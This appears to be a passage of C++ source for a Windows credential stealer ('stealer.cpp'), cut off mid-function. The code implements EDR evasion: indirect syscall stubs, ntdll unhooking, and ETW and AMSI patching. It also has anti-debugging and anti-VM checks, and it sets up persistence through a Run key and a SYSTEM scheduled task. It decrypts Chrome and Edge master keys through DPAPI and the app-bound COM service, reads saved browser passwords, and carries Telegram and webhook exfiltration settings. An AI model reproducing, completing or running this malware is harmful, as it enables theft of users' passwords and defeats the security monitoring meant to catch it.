/*
Compilación con Visual Studio (x64):
cl /EHsc /std:c++17 /O2 /MD /D_UNICODE /DUNICODE /I"C:\path\to\openssl\include" /I"C:\path\to\sqlite3" /I"C:\path\to\nlohmann" stealer.cpp /link /LIBPATH:"C:\path\to\openssl\lib" libcrypto.lib libssl.lib sqlite3.lib zlib.lib user32.lib shell32.lib advapi32.lib crypt32.lib winhttp.lib wlanapi.lib iphlpapi.lib ntdll.lib ole32.lib oleaut32.lib wbemuuid.lib dbghelp.lib psapi.lib
*/
#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wincrypt.h>
#include <sqlite3.h>
#include <nlohmann/json.hpp>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/err.h>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <memory>
#include <optional>
#include <mutex>
#include <map>
#include <algorithm>
#include <sstream>
#include <thread>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <chrono>
#include <cstring>
#include <regex>
#include <random>
#include <iomanip>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <shlobj.h>
#include <winhttp.h>
#include <wlanapi.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <DbgHelp.h>
#include <comdef.h>
#include <comutil.h>
#include <wrl/client.h>
#include <objbase.h>
#include <atlbase.h>
#include <atlcom.h>
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "zlib.lib")
using json = nlohmann::json;
namespace fs = std::filesystem;
struct Config {
    std::string telegram_bot_token;
    std::string telegram_chat_id;
    std::string webhook_url;
    bool exfiltrate = true;
    bool compress = true;
    bool silent = true;
    bool anti_debug = true;
    bool persistence = true;
    int max_threads = 0;
    std::string output_format = "json";
    std::string output_dir = "C:\\ProgramData\\SystemCache";
    std::vector<std::string> browsers_filter;
};
Config g_config;
std::mutex g_output_mutex;
std::ofstream g_output_file;
json g_global_json;
std::atomic<size_t> g_output_count{0};
std::vector<uint8_t> g_syscall_gadget_bytes;
FARPROC g_syscall_gadget = nullptr;
PVOID g_clean_ntdll = nullptr;
SIZE_T g_clean_ntdll_size = 0;
HMODULE g_ntdll = nullptr;
std::map<DWORD, PVOID> g_ssn_stubs;
std::mutex g_stub_mutex;
PVOID create_syscall_stub(DWORD ssn) {
    if (g_syscall_gadget == nullptr) return nullptr;
    BYTE stub_code[] = {
        0x4C, 0x8B, 0xD1,                         // mov r10, rcx
        0xB8, (BYTE)(ssn & 0xFF), (BYTE)((ssn >> 8) & 0xFF), (BYTE)((ssn >> 16) & 0xFF), (BYTE)((ssn >> 24) & 0xFF), // mov eax, SSN
        0xFF, 0x15, 0x02, 0x00, 0x00, 0x00,       // call [rip+2]
        0xC3,                                       // ret
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // gadget address placeholder
    };
    SIZE_T totalSize = sizeof(stub_code) + sizeof(PVOID);
    PVOID execMem = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) return nullptr;
    memcpy(execMem, stub_code, sizeof(stub_code));
    *(PVOID*)((BYTE*)execMem + sizeof(stub_code)) = g_syscall_gadget;
    return execMem;
}
NTSTATUS indirect_syscall(DWORD ssn, PVOID stub, ...) {
    if (!stub) return STATUS_UNSUCCESSFUL;
    using NtFunc = NTSTATUS(NTAPI*)(...);
    NtFunc func = (NtFunc)stub;
    return func();
}
NTSTATUS NtAllocateVirtualMemory_wrapper(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    static DWORD ssn = 0;
    static PVOID stub = nullptr;
    if (!stub) {
        auto it = g_ssn_stubs.find(djb2_hash("NtAllocateVirtualMemory"));
        if (it != g_ssn_stubs.end()) { stub = it->second; }
        else {
            for (auto& e : g_syscalls) if (e.hash == djb2_hash("NtAllocateVirtualMemory")) { ssn = e.ssn; break; }
            stub = create_syscall_stub(ssn);
            if (stub) g_ssn_stubs[djb2_hash("NtAllocateVirtualMemory")] = stub;
        }
    }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}
NTSTATUS NtWriteVirtualMemory_wrapper(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    static DWORD ssn = 0;
    static PVOID stub = nullptr;
    if (!stub) {
        auto it = g_ssn_stubs.find(djb2_hash("NtWriteVirtualMemory"));
        if (it != g_ssn_stubs.end()) { stub = it->second; }
        else {
            for (auto& e : g_syscalls) if (e.hash == djb2_hash("NtWriteVirtualMemory")) { ssn = e.ssn; break; }
            stub = create_syscall_stub(ssn);
            if (stub) g_ssn_stubs[djb2_hash("NtWriteVirtualMemory")] = stub;
        }
    }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}
NTSTATUS NtProtectVirtualMemory_wrapper(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    static DWORD ssn = 0;
    static PVOID stub = nullptr;
    if (!stub) {
        auto it = g_ssn_stubs.find(djb2_hash("NtProtectVirtualMemory"));
        if (it != g_ssn_stubs.end()) { stub = it->second; }
        else {
            for (auto& e : g_syscalls) if (e.hash == djb2_hash("NtProtectVirtualMemory")) { ssn = e.ssn; break; }
            stub = create_syscall_stub(ssn);
            if (stub) g_ssn_stubs[djb2_hash("NtProtectVirtualMemory")] = stub;
        }
    }
    return indirect_syscall(ssn, stub, ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
}
NTSTATUS NtCreateThreadEx_wrapper(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList) {
    static DWORD ssn = 0;
    static PVOID stub = nullptr;
    if (!stub) {
        auto it = g_ssn_stubs.find(djb2_hash("NtCreateThreadEx"));
        if (it != g_ssn_stubs.end()) { stub = it->second; }
        else {
            for (auto& e : g_syscalls) if (e.hash == djb2_hash("NtCreateThreadEx")) { ssn = e.ssn; break; }
            stub = create_syscall_stub(ssn);
            if (stub) g_ssn_stubs[djb2_hash("NtCreateThreadEx")] = stub;
        }
    }
    return indirect_syscall(ssn, stub, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}
NTSTATUS NtQueueApcThread_wrapper(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
    static DWORD ssn = 0;
    static PVOID stub = nullptr;
    if (!stub) {
        auto it = g_ssn_stubs.find(djb2_hash("NtQueueApcThread"));
        if (it != g_ssn_stubs.end()) { stub = it->second; }
        else {
            for (auto& e : g_syscalls) if (e.hash == djb2_hash("NtQueueApcThread")) { ssn = e.ssn; break; }
            stub = create_syscall_stub(ssn);
            if (stub) g_ssn_stubs[djb2_hash("NtQueueApcThread")] = stub;
        }
    }
    return indirect_syscall(ssn, stub, ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2, ApcArgument3);
}
struct SYSCALL_ENTRY {
    DWORD hash;
    DWORD ssn;
    PVOID address;
};
std::vector<SYSCALL_ENTRY> g_syscalls;
DWORD djb2_hash(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return (DWORD)hash;
}
void hellsgate_resolve() {
    if (!g_ntdll) g_ntdll = GetModuleHandleA("ntdll.dll");
    if (!g_ntdll) return;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)g_ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)g_ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)g_ntdll + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)g_ntdll + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)g_ntdll + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)g_ntdll + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)((BYTE*)g_ntdll + names[i]);
        if (strstr(name, "Nt") && strlen(name) > 2) {
            SYSCALL_ENTRY entry;
            entry.hash = djb2_hash(name);
            entry.ssn = *(DWORD*)((BYTE*)g_ntdll + funcs[ords[i]] + 4);
            entry.address = (BYTE*)g_ntdll + funcs[ords[i]];
            g_syscalls.push_back(entry);
        }
    }
}
void unhook_ntdll() {
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return; }
    LPVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) { CloseHandle(hMapping); CloseHandle(hFile); return; }
    g_clean_ntdll = pClean;
    g_clean_ntdll_size = GetFileSize(hFile, NULL);
    HMODULE hCurrent = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dosClean = (PIMAGE_DOS_HEADER)pClean;
    PIMAGE_NT_HEADERS ntClean = (PIMAGE_NT_HEADERS)((BYTE*)pClean + dosClean->e_lfanew);
    PIMAGE_SECTION_HEADER sect = IMAGE_FIRST_SECTION(ntClean);
    for (int i = 0; i < ntClean->FileHeader.NumberOfSections; i++) {
        if (sect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            DWORD oldProtect;
            VirtualProtect((BYTE*)hCurrent + sect[i].VirtualAddress, sect[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((BYTE*)hCurrent + sect[i].VirtualAddress, (BYTE*)pClean + sect[i].VirtualAddress, sect[i].Misc.VirtualSize);
            VirtualProtect((BYTE*)hCurrent + sect[i].VirtualAddress, sect[i].Misc.VirtualSize, oldProtect, &oldProtect);
        }
    }
}
void find_syscall_gadget() {
    if (!g_clean_ntdll) return;
    BYTE* base = (BYTE*)g_clean_ntdll;
    BYTE pattern[] = { 0x0F, 0x05, 0xC3 };
    for (SIZE_T i = 0; i < g_clean_ntdll_size - sizeof(pattern); i++) {
        if (memcmp(base + i, pattern, sizeof(pattern)) == 0) {
            g_syscall_gadget = (FARPROC)((BYTE*)GetModuleHandleA("ntdll.dll") + i);
            return;
        }
    }
}
void patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    PVOID pEtwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;
    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    ((BYTE*)pEtwEventWrite)[0] = 0x48;
    ((BYTE*)pEtwEventWrite)[1] = 0x31;
    ((BYTE*)pEtwEventWrite)[2] = 0xC0;
    ((BYTE*)pEtwEventWrite)[3] = 0xC3;
    VirtualProtect(pEtwEventWrite, 16, oldProtect, &oldProtect);
}
void patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    PVOID pAmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return;
    DWORD oldProtect;
    VirtualProtect(pAmsiScanBuffer, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
    ((BYTE*)pAmsiScanBuffer)[0] = 0x48;
    ((BYTE*)pAmsiScanBuffer)[1] = 0x31;
    ((BYTE*)pAmsiScanBuffer)[2] = 0xC0;
    ((BYTE*)pAmsiScanBuffer)[3] = 0xC3;
    VirtualProtect(pAmsiScanBuffer, 16, oldProtect, &oldProtect);
}
void ekko_sleep(DWORD ms) {
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent) { Sleep(ms); return; }
    HANDLE hThread = GetCurrentThread();
    auto callback = [](ULONG_PTR Parameter) -> void { NtTestAlert_wrapper(); };
    for (DWORD i = 0; i < ms / 10; i++) {
        NtQueueApcThread_wrapper(hThread, (PVOID)callback, (ULONG_PTR)hEvent, 0, 0);
        NtTestAlert_wrapper();
        WaitForSingleObject(hEvent, 10);
    }
    CloseHandle(hEvent);
}
NTSTATUS NtTestAlert_wrapper() {
    static DWORD ssn = 0;
    static PVOID stub = nullptr;
    if (!stub) {
        auto it = g_ssn_stubs.find(djb2_hash("NtTestAlert"));
        if (it != g_ssn_stubs.end()) { stub = it->second; }
        else {
            for (auto& e : g_syscalls) if (e.hash == djb2_hash("NtTestAlert")) { ssn = e.ssn; break; }
            stub = create_syscall_stub(ssn);
            if (stub) g_ssn_stubs[djb2_hash("NtTestAlert")] = stub;
        }
    }
    return indirect_syscall(ssn, stub);
}
bool is_debugged() {
    if (IsDebuggerPresent()) return true;
    HANDLE hProcess = GetCurrentProcess();
    PROCESS_BASIC_INFORMATION pbi{};
    ULONG returnLength;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);
    if (status == 0 && pbi.PebBaseAddress && pbi.PebBaseAddress->BeingDebugged) return true;
    if (pbi.PebBaseAddress) {
        DWORD ntGlobalFlag = *(DWORD*)((BYTE*)pbi.PebBaseAddress + 0x68);
        if (ntGlobalFlag & 0x70) return true;
    }
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
    }
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    __rdtsc();
    QueryPerformanceCounter(&end);
    if ((end.QuadPart - start.QuadPart) < 100) return true;
    if (FindWindowA(NULL, "x64dbg") || FindWindowA(NULL, "OllyDbg") || FindWindowA(NULL, "IDA")) return true;
    return false;
}
bool is_vm() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 0x40000000);
    char hypervisor_vendor[13] = {0};
    memcpy(hypervisor_vendor, &cpuInfo[1], 4);
    memcpy(hypervisor_vendor + 4, &cpuInfo[2], 4);
    memcpy(hypervisor_vendor + 8, &cpuInfo[3], 4);
    if (!strcmp(hypervisor_vendor, "VMwareVMware") || !strcmp(hypervisor_vendor, "VBoxVBoxVBox") ||
        !strcmp(hypervisor_vendor, "Microsoft Hv") || !strcmp(hypervisor_vendor, "KVMKVMKVM"))
        return true;
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(100);
    QueryPerformanceCounter(&end);
    if ((end.QuadPart - start.QuadPart) < 50) return true;
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return true;
    SYSTEM_INFO sys;
    GetSystemInfo(&sys);
    if (sys.dwNumberOfProcessors < 2) return true;
    ULARGE_INTEGER freeSpace;
    GetDiskFreeSpaceExA("C:\\", &freeSpace, NULL, NULL);
    if (freeSpace.QuadPart < 10ULL * 1024 * 1024 * 1024) return true;
    return false;
}
void anti_debug_loop() {
    while (true) {
        if (is_debugged() || is_vm()) {
            for (;;) ekko_sleep(10000);
        }
        ekko_sleep(1000);
    }
}
std::string random_string(size_t length) {
    const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dist(0, strlen(charset) - 1);
    std::string result;
    result.reserve(length);
    for (size_t i = 0; i < length; ++i) result.push_back(charset[dist(gen)]);
    return result;
}
std::string base64_encode(const std::vector<uint8_t>& data) {
    static const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    int val = 0, valb = -6;
    for (auto c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            result.push_back(b64[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) result.push_back(b64[((val << 8) >> (valb + 8)) & 0x3F]);
    while (result.size() % 4) result.push_back('=');
    return result;
}
std::vector<uint8_t> base64_decode(const std::string& encoded) {
    static const std::string b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> result;
    int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (c == '=') break;
        size_t pos = b64.find(c);
        if (pos == std::string::npos) continue;
        val = (val << 6) + pos;
        valb += 6;
        if (valb >= 0) {
            result.push_back((val >> valb) & 0xFF);
            valb -= 8;
        }
    }
    return result;
}
std::string wstr_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string utf8(size, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &utf8[0], size, NULL, NULL);
    return utf8;
}
std::wstring utf8_to_wstr(const std::string& str) {
    if (str.empty()) return {};
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), NULL, 0);
    std::wstring wstr(size, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.size(), &wstr[0], size);
    return wstr;
}
void install_persistence() {
    std::string key = random_string(8);
    std::string path = fs::current_path().string() + "\\" + fs::path(GetModuleFileNameA(NULL)).filename().string();
    std::wstring wpath = utf8_to_wstr(path);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, utf8_to_wstr(key).c_str(), 0, REG_SZ, (const BYTE*)wpath.c_str(), (DWORD)((wpath.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
    std::wstring taskName = L"Microsoft\\Windows\\Update\\" + utf8_to_wstr(key);
    std::wstring cmd = L"schtasks /create /tn \"" + taskName + L"\" /tr \"" + wpath + L"\" /sc onlogon /ru SYSTEM /f";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
std::vector<uint8_t> decrypt_dpapi(const std::vector<uint8_t>& encrypted) {
    DATA_BLOB in = { (DWORD)encrypted.size(), (BYTE*)encrypted.data() };
    DATA_BLOB out = { 0 };
    if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) return {};
    std::vector<uint8_t> decrypted(out.pbData, out.pbData + out.cbData);
    LocalFree(out.pbData);
    return decrypted;
}
std::optional<std::string> decrypt_aes_gcm(const std::vector<uint8_t>& key, const std::vector<uint8_t>& ciphertext) {
    if (ciphertext.size() < 28) return std::nullopt;
    std::vector<uint8_t> nonce(ciphertext.begin(), ciphertext.begin() + 12);
    std::vector<uint8_t> tag(ciphertext.begin() + ciphertext.size() - 16, ciphertext.end());
    std::vector<uint8_t> ct(ciphertext.begin() + 12, ciphertext.begin() + ciphertext.size() - 16);
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return std::nullopt;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, key.data(), nonce.data());
    std::vector<uint8_t> plaintext(ct.size() + 16);
    int len = 0, pLen = 0;
    EVP_DecryptUpdate(ctx, plaintext.data(), &len, ct.data(), (int)ct.size());
    EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &pLen);
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(len + pLen);
    return std::string(plaintext.begin(), plaintext.end());
}
std::optional<std::string> decrypt_app_bound_key(const std::string& encrypted_key_b64, const std::wstring& browser_app_path) {
    CLSID clsid;
    if (FAILED(CLSIDFromString(L"{708860E0-F641-4611-8895-7D867DD3675B}", &clsid))) return std::nullopt;
    IID iid;
    if (FAILED(IIDFromString(L"{A949CB4E-C4F9-44C1-B213-6BF8C7F8D6A6}", &iid))) return std::nullopt;
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    CComPtr<IUnknown> pUnknown;
    HRESULT hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IUnknown, (void**)&pUnknown);
    if (FAILED(hr)) { CoUninitialize(); return std::nullopt; }
    CComQIPtr<IDispatch> pDispatch(pUnknown);
    if (!pDispatch) { CoUninitialize(); return std::nullopt; }
    DISPID dispid;
    LPOLESTR methodName = L"DecryptData";
    hr = pDispatch->GetIDsOfNames(IID_NULL, &methodName, 1, LOCALE_USER_DEFAULT, &dispid);
    if (FAILED(hr)) { CoUninitialize(); return std::nullopt; }
    CComVariant varResult;
    CComBSTR bstrEncrypted(utf8_to_wstr(encrypted_key_b64).c_str());
    DISPPARAMS params = {0};
    params.cArgs = 1;
    VARIANTARG args[1];
    VariantInit(&args[0]);
    args[0].vt = VT_BSTR;
    args[0].bstrVal = bstrEncrypted;
    params.rgvarg = args;
    hr = pDispatch->Invoke(dispid, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &params, &varResult, NULL, NULL);
    if (FAILED(hr)) { CoUninitialize(); return std::nullopt; }
    std::string result;
    if (varResult.vt == VT_BSTR) {
        result = wstr_to_utf8(varResult.bstrVal);
    }
    CoUninitialize();
    if (result.empty()) return std::nullopt;
    return result;
}
std::optional<std::string> resolve_app_bound_key(const std::string& encrypted_key_b64, const std::string& browser_name) {
    std::wstring browserPath;
    if (browser_name == "Chrome") {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t path[MAX_PATH];
            DWORD size = sizeof(path);
            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
                browserPath = path;
            }
            RegCloseKey(hKey);
        }
    } else if (browser_name == "Edge") {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            wchar_t path[MAX_PATH];
            DWORD size = sizeof(path);
            if (RegQueryValueExW(hKey, L"Path", NULL, NULL, (LPBYTE)path, &size) == ERROR_SUCCESS) {
                browserPath = path;
            }
            RegCloseKey(hKey);
        }
    }
    if (browserPath.empty()) return std::nullopt;
    std::wstring myPath(MAX_PATH, L'\0');
    GetModuleFileNameW(NULL, &myPath[0], MAX_PATH);
    myPath.resize(wcslen(myPath.c_str()));
    fs::path targetDir(browserPath);
    if (!fs::equivalent(fs::path(myPath).parent_path(), targetDir)) {
        std::wstring newExe = targetDir / (L"tmp_" + utf8_to_wstr(random_string(8)) + L".exe");
        if (!CopyFileW(myPath.c_str(), newExe.c_str(), FALSE)) return std::nullopt;
        PROCESS_INFORMATION pi;
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        std::wstring cmdLine = L"\"" + newExe + L"\" --app-key-decrypt " + utf8_to_wstr(encrypted_key_b64) + L" --browser-app-path \"" + browserPath + L"\"";
        if (CreateProcessW(NULL, &cmdLine[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 15000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        DeleteFileW(newExe.c_str());
        std::string outputFile = wstr_to_utf8(targetDir / L"appkey.txt");
        std::ifstream f(outputFile);
        if (f.is_open()) {
            std::string decryptedKey;
            std::getline(f, decryptedKey);
            f.close();
            DeleteFileA(outputFile.c_str());
            if (!decryptedKey.empty()) return decryptedKey;
        }
        return std::nullopt;
    } else {
        return decrypt_app_bound_key(encrypted_key_b64, browserPath);
    }
}
std::optional<std::vector<uint8_t>> get_master_key(const fs::path& local_state_path, const std::string& browser_name) {
    std::ifstream file(local_state_path);
    if (!file.is_open()) return std::nullopt;
    json data;
    try { file >> data; }
    catch (...) { return std::nullopt; }
    if (!data.contains("os_crypt") || !data["os_crypt"].contains("encrypted_key")) return std::nullopt;
    std::string enc_key_b64 = data["os_crypt"]["encrypted_key"];
    auto enc_key = base64_decode(enc_key_b64);
    if (enc_key.size() < 5) return std::nullopt;
    if (enc_key[0] == 0x01) {
        return std::nullopt;
    }
    if (enc_key[0] == 0x02 || (enc_key.size() > 4 && memcmp(enc_key.data(), "APPB", 4) == 0)) {
        auto resolved = resolve_app_bound_key(enc_key_b64, browser_name);
        if (resolved) {
            auto keyBytes = base64_decode(*resolved);
            if (keyBytes.size() == 32) return keyBytes;
        }
        return std::nullopt;
    }
    auto decrypted = decrypt_dpapi(std::vector<uint8_t>(enc_key.begin() + 5, enc_key.end()));
    if (decrypted.empty() || decrypted.size() != 32) return std::nullopt;
    return decrypted;
}
std::optional<std::string> decrypt_blob(const std::vector<uint8_t>& master_key, const std::vector<uint8_t>& encrypted_blob) {
    if (encrypted_blob.size() < 3 + 12 + 16) return std::nullopt;
    if (encrypted_blob[0] != 0x76 || encrypted_blob[1] != 0x31) return std::nullopt;
    std::vector<uint8_t> nonce(encrypted_blob.begin() + 3, encrypted_blob.begin() + 3 + 12);
    std::vector<uint8_t> ct(encrypted_blob.begin() + 3 + 12, encrypted_blob.end());
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return std::nullopt;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, master_key.data(), nonce.data());
    std::vector<uint8_t> plaintext(ct.size());
    int len = 0;
    EVP_DecryptUpdate(ctx, plaintext.data(), &len, ct.data(), (int)ct.size());
    int pLen = 0;
    EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &pLen);
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(len + pLen);
    return std::string(plaintext.begin(), plaintext.end());
}
static void sqlite3_deleter(sqlite3* p) { if (p) sqlite3_close(p); }
static void sqlite3_stmt_deleter(sqlite3_stmt* p) { if (p) sqlite3_finalize(p); }
std::vector<fs::path> find_profiles(const fs::path& data_dir) {
    std::vector<fs::path> profiles;
    if (!fs::exists(data_dir)) return profiles;
    for (auto& entry : fs::directory_iterator(data_dir)) {
        if (entry.is_directory()) {
            std::string name = entry.path().filename().string();
            if (name == "Default" || name.find("Profile") != std::string::npos) {
                profiles.push_back(entry.path());
            }
        }
    }
    return profiles;
}
void write_entry(const json& entry) {
    std::lock_guard<std::mutex> lock(g_output_mutex);
    if (g_output_file.is_open()) {
        if (g_output_count > 0) g_output_file << ",\n";
        g_output_file << entry.dump();
        g_output_count++;
    }
    std::string type = entry.value("type", "unknown");
    if (g_global_json.contains(type)) {
        g_global_json[type].push_back(entry);
    } else {
        g_global_json[type] = json::array({entry});
    }
}
void extract_passwords(const fs::path& profile_dir, const std::vector<uint8_t>& master_key,
                       const std::string& browser_name, const std::string& profile_name) {
    fs::path login_db = profile_dir / "Login Data";
    if (!fs::exists(login_db)) return;
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(login_db.string().c_str(), &db, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3, decltype(&sqlite3_deleter)> db_guard(db, sqlite3_deleter);
    const char* query = "SELECT origin_url, username_value, password_value, signon_realm FROM logins;";
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) return;
    std::unique_ptr<sqlite3_stmt, decltype(&sqlite3_stmt_deleter)> stmt_guard(stmt, sqlite3_stmt_deleter);
    while (sqlite3_step(stmt) == SQLITE_ROW) {
